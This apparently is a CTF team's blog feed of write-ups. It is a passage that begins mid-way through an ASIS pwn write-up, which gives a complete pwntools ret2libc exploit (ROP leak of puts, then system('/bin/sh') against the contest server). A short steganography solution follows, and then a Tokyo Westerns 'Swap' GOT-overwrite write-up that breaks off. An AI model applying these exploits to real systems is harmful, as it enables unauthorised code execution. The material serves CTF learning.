120</span></div></pre></td></tr></table></figure>
<p>The offset is 120.</p>
<hr>
<h3 id="Leak-puts-address"><a href="#Leak-puts-address" class="headerlink" title="Leak puts address"></a>Leak puts address</h3><p>We have to leak the libc address from puts, we can do this by using puts_plt and puts_got addresses with return oriented programming, keep in mind that in x86 parameters are stored on the stack, but in x64 the first six parameters are saved in <code>RDI, RSI, RDX, RCX, R8 and R9</code>, if there are more parameters will be saved on the stack. So if we want to build the Rop chain to call puts we should first <code>POP RDI RET</code> so we save the next value in the stack to RDI.</p>
<p>To find the <code> POP RDI; RET </code> gadget we can use <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPgadgets</a>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary ./mrs._hudson --only <span class="string">"pop|ret"</span></div><div class="line">Gadgets information</div><div class="line">============================================================</div><div class="line">0x00000000004006ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006ee : pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006f0 : pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006f2 : pop r15 ; ret</div><div class="line">0x00000000004006eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004006ef : pop rbp ; pop r14 ; pop r15 ; ret</div><div class="line">0x0000000000400575 : pop rbp ; ret</div><div class="line">0x00000000004006f3 : pop rdi ; ret</div><div class="line">0x00000000004006f1 : pop rsi ; pop r15 ; ret</div><div class="line">0x00000000004006ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</div><div class="line">0x00000000004004ee : ret</div><div class="line">0x00000000004005a5 : ret 0xc148</div></pre></td></tr></table></figure>
<p>Now start building our exploit to leak puts libc address:   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./mrs._hudson'</span>)</div><div class="line">local = <span class="keyword">True</span></div><div class="line"></div><div class="line">POPRET = <span class="number">0x00000000004006f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">120</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line"></div><div class="line"></div><div class="line">r = process(<span class="string">'./mrs._hudson'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'178.62.249.106'</span>, <span class="number">8642</span>)</div><div class="line">r.recvline()</div><div class="line"></div><div class="line">r.sendline(padding + ropchain)</div><div class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">log.info(<span class="string">"PUTS 0x%x"</span> % PUTS)</div></pre></td></tr></table></figure>
<hr>
<h3 id="Search-libc-database"><a href="#Search-libc-database" class="headerlink" title="Search libc-database"></a>Search libc-database</h3><p>We can user this <a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a> and try to find a lib to corresponds to our puts leaked address:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ python mrs._hudson.py</div><div class="line">[*] &apos;~/ctf/asis/pwn/mrs._hudson&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to 178.62.249.106 on port 8642: Done</div><div class="line">[*] Puts 0x7fc73fd10690</div><div class="line"></div><div class="line">$ ./find puts 0x7fc73fd10690 #libc-database folder</div><div class="line">ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu9_amd64)</div><div class="line">~/ctf/tokyo/pwn/swap/libc.so.6 (id local-14c22be9aa11316f89909e4237314e009da38883)</div></pre></td></tr></table></figure>
<p>It was funny because it was the same libc.so of a challenge I did previously in tokyo westerns.</p>
<hr>
<h3 id="Calculate-libcbase-and-other-addresses"><a href="#Calculate-libcbase-and-other-addresses" class="headerlink" title="Calculate libcbase and other addresses"></a>Calculate libcbase and other addresses</h3><p>Now that we have the lib.so.6 we can now use extract from it the offsets using <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">pwntools</a>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">binary = ELF(<span class="string">'./mrs._hudson'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>) <span class="comment"># got libc from libc-database</span></div><div class="line">local = <span class="keyword">False</span></div><div class="line"></div><div class="line">POPRET = <span class="number">0x00000000004006f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">120</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"></div><div class="line">r = process(<span class="string">'./mrs._hudson'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'178.62.249.106'</span>, <span class="number">8642</span>)</div><div class="line">r.recvline()</div><div class="line"></div><div class="line">r.sendline(padding + ropchain)</div><div class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">LIBCBASE = PUTS - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x18cd17</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % (BINSH))</div></pre></td></tr></table></figure>
<hr>
<h3 id="Return-to-main-and-jump-to-system-‘-bin-sh’"><a href="#Return-to-main-and-jump-to-system-‘-bin-sh’" class="headerlink" title="Return to main and jump to system(‘/bin/sh’)"></a>Return to main and jump to system(‘/bin/sh’)</h3><p>First lets get the main address from radare2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">            ;-- main:</div><div class="line">/ (fcn) sym.main 109</div><div class="line">|   sym.main ();</div><div class="line">|           ; var int local_80h @ rbp-0x80</div><div class="line">|           ; var int local_74h @ rbp-0x74</div><div class="line">|           ; var int local_70h @ rbp-0x70</div><div class="line">|              ; DATA XREF from 0x0040054d (entry0)</div><div class="line">|           0x0040061a      55             push rbp</div></pre></td></tr></table></figure>
<p>We add MAIN to our rop chain, after we execute puts, we jump to main again:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">MAIN = <span class="number">0x000000000040061A</span></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div></pre></td></tr></table></figure>
<p>And now the final exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> struct </div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./mrs._hudson'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'178.62.249.106'</span>, <span class="number">8642</span>)</div><div class="line"></div><div class="line"></div><div class="line">binary = ELF(<span class="string">'./mrs._hudson'</span>)</div><div class="line">libc = ELF(<span class="string">'libc.so.6'</span>) <span class="comment"># got libc from libc-database</span></div><div class="line">local = <span class="keyword">False</span></div><div class="line"></div><div class="line">POPRET = <span class="number">0x00000000004006f3</span></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">PUTSGOT = binary.got[<span class="string">'puts'</span>]</div><div class="line">MAIN = <span class="number">0x000000000040061A</span></div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">120</span></div><div class="line"></div><div class="line">ropchain = <span class="string">''</span></div><div class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></div><div class="line">ropchain += p64(PUTSGOT) <span class="comment"># PUTS ADDRESS ARG[1]</span></div><div class="line">ropchain += p64(PUTSPLT) <span class="comment"># PUTS function "call"</span></div><div class="line">ropchain += p64(MAIN) <span class="comment"># MAIN function "call"</span></div><div class="line"></div><div class="line">r = getConn()</div><div class="line">r.recvline()</div><div class="line"></div><div class="line">r.sendline(padding + ropchain)</div><div class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">LIBCBASE = PUTS - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line">BINSH = LIBCBASE + <span class="number">0x18cd17</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"PUTS 0x%x"</span> % PUTS)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">log.info(<span class="string">"Binsh 0x%x"</span> % (BINSH))</div><div class="line"></div><div class="line">r.recvline()</div><div class="line">r.recvline()</div><div class="line">r.sendline(padding + p64(POPRET) + p64(BINSH) + p64(SYSTEM))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Run and get the flag:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$ python mrs._hudson.py</div><div class="line">[*] <span class="string">'~/ctf/asis/pwn/mrs._hudson'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[*] <span class="string">'~/ctf/asis/pwn/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] Opening connection to 178.62.249.106 on port 8642: Done</div><div class="line">[*] LIBC 0x7ff6d2ec0000</div><div class="line">[*] PUTS 0x7ff6d2f2f690</div><div class="line">[*] SYSTEM 0x7ff6d2f05390</div><div class="line">[*] Binsh 0x7ff6d304cd17</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls home</div><div class="line">frontofficemanager</div><div class="line">$ ls home/frontofficemanager</div><div class="line">flag</div><div class="line">hudson_3ab429dd29d62964e5596e6afe0d17d9</div><div class="line">$ cat home/frontofficemanager/flag</div><div class="line">ASIS&#123;W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Average: 2.94&lt;br&gt;Rating Count: 17&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    dodododo&lt;br&gt;    RPISEC&lt;br&gt;    TokyoWesterns&lt;br&gt;&lt;br&gt;Points&lt;br&gt;54
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[Stego] ASIS - ASIS secret letter</title>
    <link href="https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/"/>
    <id>https://teamrocketist.github.io/2017/09/10/Stego-ASIS-ASIS-secret-letter/</id>
    <published>2017-09-10T18:10:59.000Z</published>
    <updated>2017-09-10T18:46:40.288Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> ASIS secret letter<br><br>Average: 4.17<br>Rating Count: 6<br>You Rated: 5<br>Top 3 Solver<br><br>    Teamrocketist<br>    dcua<br>    CodiSec<br><br>Points<br>202<br>Solves<br>17<br>Category<br>Misc Stego<br><br>Description:<br><br>    The face is the index of the mind, its ASIS secret letter!<br></blockquote>


<p>We have two images lets use binwalk on the jpg image:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ binwalk a.jpg </div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">56            0x38            Zlib compressed data, default compression</div></pre></td></tr></table></figure>
<p>Doesn’t look like it has something special so lets extract the files using binwalk again but with the parameter e:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ binwalk -e a.jpg</div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</div><div class="line">56            0x38            Zlib compressed data, default compression</div></pre></td></tr></table></figure>
<p>Binwalk will create a folder with extracted files:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls_a.jpg.extracted/</div><div class="line">38  38.zlib</div></pre></td></tr></table></figure>
<p>Checking the 38 file we can see we have a double encoded base64 string:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cat 38 | base64 -d | base64 -d</div><div class="line">💌  from ASIS with love, please find secret message and reply soon, powered by 👉  Stéganô 👈⏎</div></pre></td></tr></table></figure>
<p>Stéganô is a python package for steganography which can be found here <a href="https://github.com/cedricbonhomme/Stegano" target="_blank" rel="external">https://github.com/cedricbonhomme/Stegano</a></p>
<p>Now using stegano to extract something from png, there was two binaries in stegano we tried with stegano-lsb but it didn’t work so we tried with stegano-lsb-set with the generator triangular_numbers:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ Stegano/bin/stegano-lsb-set reveal -i e07d17ed7d8104590ff3e17bdf052057.png -g triangular_numbers</div><div class="line">ASIS&#123;767ba85340d9e49fa0bb9c2b12037f08&#125;</div></pre></td></tr></table></figure>
<p>And we got the flag!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; ASIS secret letter&lt;br&gt;&lt;br&gt;Average: 4.17&lt;br&gt;Rating Count: 6&lt;br&gt;You Rated: 5&lt;br&gt;Top 3 Solver&lt;br&gt;&lt;br&gt;    Teamrocketist&lt;br&gt;    
    
    </summary>
    
      <category term="Stego" scheme="https://teamrocketist.github.io/categories/Stego/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
      <category term="stegano" scheme="https://teamrocketist.github.io/tags/stegano/"/>
    
      <category term="binwalk" scheme="https://teamrocketist.github.io/tags/binwalk/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Swap</title>
    <link href="https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/"/>
    <id>https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/</id>
    <published>2017-09-07T02:47:20.000Z</published>
    <updated>2017-09-07T04:52:15.777Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>The swapping is interesting. Let’s try!<br><br>nc pwn1.chal.ctf.westerns.tokyo 19937<br>swap<br>libc.so.6<br></blockquote>

<p>We are given an 64 bit ELF for Linux x86-64:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file swap</div><div class="line">swap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=74448e9fb5920898de1f9b5115c764eff1c8edac, not stripped</div></pre></td></tr></table></figure>
<p>We decompile it using ida’s pseudo c converter:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+20h] [bp-20h]@0</span></div><div class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [sp+28h] [bp-18h]@0</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+30h] [bp-10h]@7</span></div><div class="line"></div><div class="line">  initialize();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      print_menu();</div><div class="line">      v3 = read_int();</div><div class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      src = (<span class="keyword">void</span> *)read_ll();</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      v5 = (<span class="keyword">void</span> *)read_ll();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memcpy</span>(&amp;dest, src, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(src, v5, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(v5, &amp;dest, <span class="number">8u</span>LL);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !v3 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Bye."</span>);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">__<span class="function">int64 <span class="title">read_int</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-90h]@1</span></div><div class="line"></div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</div><div class="line">  result = atoi(&amp;buf);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">__<span class="function">int64 <span class="title">read_ll</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-110h]@1</span></div><div class="line"></div><div class="line"></div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</div><div class="line">  result = atoll(&amp;buf);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Resuming what the program is actually doing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Option 1 - Choose two addresses</div><div class="line">Option 2 - Swap 2 addresses previously chosen (can be used to switch <span class="keyword">function</span> addresses <span class="keyword">for</span> example)</div><div class="line">Option 3 - Prints <span class="built_in">bye</span> and exits</div></pre></td></tr></table></figure>
<p>The first thing we can start doing is to get the GOT(Global Offset Table) addresses of the functions we need, we can do this in 3 ways:<br>objdump</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ objdump -R swap</div></pre></td></tr></table></figure>
<p>readelf</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ readelf -r swap</div></pre></td></tr></table></figure>
<p>pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">ATOIGOT = binary.got[<span class="string">'atoi'</span>]</div><div class="line">PUTSGOT =  binary.got[<span class="string">'puts'</span>]</div><div class="line">READGOT =  binary.got[<span class="string">'read'</span>]</div><div class="line">MEMCOPYGOT = binary.got[<span class="string">'memcpy'</span>]</div></pre></td></tr></table></figure>
<p>To get the PLT addresses we can either use objdump or pwntools again<br>objdump</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -dj.plt swap</div></pre></td></tr></table></figure>
<p>pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">PUTSPLT =  binary.plt[<span class="string">'puts'</span>]</div></pre></td></tr></table></figure>
<p>Now making a nice function to swap addresses in python : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(address1, address2)</span>:</span></div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">  send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 1st addr'</span>)</div><div class="line">  send(str(address1))</div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 2nd addr'</span>)</div><div class="line">  send(str(address2))</div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">  send(<span class="string">'2'</span>)</div></pre></td></tr></table></figure>
<p>We can start by thinking into changing <code>memcpy_got</code> and read_got addresses, and why? because with this when we choose the option 2 to swap we will have something like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">read(&amp;dest, address1, <span class="number">8u</span>LL);</div><div class="line">read(address1, address2, <span class="number">8u</span>LL);</div><div class="line">read(address2, &amp;dest, <span class="number">8u</span>LL);</div></pre></td></tr></table></figure>
<p>The second read is what is interesting to us, we can controll the first two arguments to our advantage, if we choose the 1st address to be the file descriptor 0(<code>STDIN</code>) and the 2nd address the function we want to overwrite.   </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">read(<span class="number">0</span>, ATOI_GOT, <span class="number">0x8</span>); <span class="comment">// example: 1st arg: 0, 2nd arg: ATOI_GOT</span></div></pre></td></tr></table></figure>
